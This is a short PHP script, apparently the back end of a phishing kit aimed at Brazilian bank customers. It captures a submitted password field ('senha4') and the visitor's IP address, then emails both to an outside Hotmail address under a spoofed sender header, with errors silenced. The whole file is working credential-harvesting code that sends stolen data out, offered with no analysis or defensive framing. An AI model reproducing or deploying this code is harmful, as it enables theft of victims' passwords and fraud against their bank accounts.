<?php

$senha4=$_POST['senha4']; 

$ip = $_SERVER["REMOTE_ADDR"];
$hora=date("H:i:s");

$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From: MOBILE-2 <info@filefree.com>";
$conteudo.="[4]: $senha4 [IP do Bico] $ip";

@mail("bb-pernambuco@hotmail.com", "$ip", "$conteudo", $headers); 

?>